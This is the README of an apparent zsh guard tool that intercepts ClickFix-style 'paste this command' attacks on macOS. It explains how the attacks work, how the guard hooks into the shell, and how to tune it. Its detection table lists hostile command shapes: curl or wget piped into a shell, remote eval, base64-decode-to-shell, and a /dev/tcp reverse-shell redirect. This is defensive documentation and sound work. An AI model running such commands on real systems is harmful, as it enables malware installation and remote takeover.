# ShellGuard

Part of the **ClickFix Defense Kit**.

A zsh guard that intercepts dangerous "download-and-execute" / "decode-and-execute"
commands **before they run**, explains in plain language what the command would do,
and forces you to type a confirmation phrase before it will execute. Everything
else runs untouched.

This is the load-bearing control in the kit: it blocks at the **execute** moment,
which is the last and most authoritative point in the chain.

---

## The "ClickFix" threat it stops

ClickFix / FakeCAPTCHA attacks work like this:

1. A malicious or SEO-poisoned page shows a fake "Verify you are human" CAPTCHA,
   a fake browser/AI-tool update, or a fake "fix this error" prompt.
2. The page **silently copies a shell command to your clipboard**.
3. It tells you to open Terminal, paste, and press Enter "to complete verification."
4. You paste a `curl … | sh` (or a `base64 -d | sh`, or an `eval $(curl …)`), and
   in one keystroke a macOS infostealer (AMOS / Atomic / Poseidon family) is
   downloading, running, and asking for your password.

**Why macOS doesn't save you here:** Gatekeeper, notarization, and XProtect only
inspect files carrying the `com.apple.quarantine` attribute, which is attached by
download-aware apps (Safari, Mail, Messages). A command you paste into Terminal —
or a `curl` piped straight to a shell — never gets that attribute and never
triggers a file-launch event. Gatekeeper is **structurally bypassed**, not
defeated. The macOS 26.4 Terminal paste-block is warn-only, user-overridable
("Paste Anyway"), and source-app based, so it provably misses `curl|bash` copied
from Safari. The only thing left is **you not hitting Enter on autopilot** — and
autopilot is exactly what the attack exploits.

ShellGuard breaks the autopilot. When a flagged command is about to run, it stops,
explains the risk, and makes you type a full phrase (default `I-UNDERSTAND`) on the
terminal itself. A typed phrase — not a single `y` — is intentional: one keypress
is too easy to muscle-memory through.

> **Honest limits.** ShellGuard reduces risk and raises literacy. It cannot stop a
> determined user who reads the warning and types the confirmation phrase anyway,
> and it only guards your **zsh** prompt — it does not protect `bash`, other shells,
> a command run from a script, or text pasted into an app that isn't your shell.
> Pair it with the clipboard watcher (warns at copy time) and the exposure scanner
> from the rest of the kit.

---

## What it flags

ShellGuard fires only on the dangerous **shape** of a command, not on the mere
presence of `curl`. It detects:

| Pattern | Example |
|---|---|
| Download piped into a shell/interpreter | `curl … \| sh`, `wget -qO- … \| sudo bash`, `fetch … \| zsh` |
| `eval`/`exec`/`source` of a remote command substitution | `eval "$(curl -s …)"`, `exec $(wget …)` |
| base64 decode piped into a shell | `base64 -d … \| sh`, `echo <blob> \| base64 -d \| bash` |
| Long base64 blob piped into base64/openssl/a shell | `echo TUFM… \| base64 -d` |
| Inline interpreter that fetches + execs | `python3 -c '…urllib…exec(...)'`, `node -c '…http…'` |
| Remote content piped into `osascript` (AppleScript) | `curl … \| osascript` |
| `osascript` output piped into a shell | `osascript … \| bash` |
| bash reverse-shell redirect | `… >& /dev/tcp/10.0.0.1/4444 0>&1` |

It does **not** fire on ordinary commands — `curl -O https://example.com/x.tgz`,
`git clone …`, `cat f \| base64`, `python3 -c 'print(1+1)'`, `npm run build \| tee`,
etc. all run with no prompt. See [`test-cases.md`](./test-cases.md) for the full
safe-vs-dangerous matrix that the regex is verified against.

---

## Install

```sh
cd shellguard
./install.sh
```

This appends a single, idempotent `source` line to `~/.zshrc`. Open a new terminal
(or `source ~/.zshrc`) and the guard is active.

Other forms:

```sh
./install.sh --uninstall     # cleanly remove the block from ~/.zshrc
./install.sh --rc ~/.zshrc.local   # target a different rc file
./install.sh --help
```

The installer is a plain, readable bash script. **It does not pipe anything from
the internet** — that is the exact pattern ShellGuard exists to stop, and a
security tool should never train you into the habit it's defending against.

### How it hooks in (technical)

ShellGuard binds a custom ZLE widget over `accept-line`. A ZLE widget can refuse to
run a command simply by **not** calling the builtin `accept-line` — whereas
`preexec` fires too late to cleanly abort and can't reliably read your typed
confirmation. ShellGuard reads the confirmation from `/dev/tty` (not stdin), because
inside a ZLE widget the line editor owns the keyboard.

If you already run `zsh-syntax-highlighting`, `zsh-autosuggestions`, or oh-my-zsh
(all of which wrap `accept-line`), ShellGuard **chains to** the existing widget
instead of clobbering it, so those plugins keep working. It also wraps
`bracketed-paste` to give you an *advisory* heads-up the moment a dangerous-looking
command is pasted, before you even press Enter.

---

## False-positive tuning

Over-prompting is the #1 reason people disable a guard and then ignore it. ShellGuard
ships with mitigations, all overridable in `~/.zshrc` **after** the source line.

**1. Trusted-host allowlist.** If every download URL in a flagged command points at a
well-known installer host, the guard stays silent. Defaults include `sh.rustup.rs`,
`get.docker.com`, `raw.githubusercontent.com`, `install.python-poetry.org`,
`get.pnpm.io`, `bun.sh`, and more. Extend it:

```zsh
# in ~/.zshrc, AFTER the shellguard source line:
CLICKFIX_GUARD_ALLOW_HOSTS+=( my.internal-ci.example registry.example.com )
```

> Note: payloads with **no** URL (a `base64 -d | sh` blob, a `/dev/tcp` reverse
> shell) are never auto-trusted, because there's no host to vouch for them.

**2. Per-session disable (escape hatch).** For trusted automation or a scripted
session:

```zsh
export CLICKFIX_GUARD=0      # disable for the rest of this shell
CLICKFIX_GUARD=0 some-installer-script.sh   # disable for one command
```

**3. Change the confirmation phrase.** Make it something only you would type:

```zsh
CLICKFIX_GUARD_PHRASE='yes-run-this-now'
```

**4. If something legit keeps tripping it,** prefer adding its host to the allowlist
over disabling the guard — that keeps protection on for everything else.

---

## Cost

Effectively zero. The regex runs once per Enter keypress on a short string. There's
no daemon, no network, no logging of your commands, and nothing leaves your machine.

---

## Files

| File | Purpose |
|---|---|
| `shellguard.zsh` | The guard (ZLE `accept-line` + `bracketed-paste` widgets) |
| `install.sh` | Idempotent installer / uninstaller for `~/.zshrc` |
| `test-cases.md` | Safe-vs-dangerous command matrix the regex is verified against |
| `README.md` | This file |

Defensive use only.
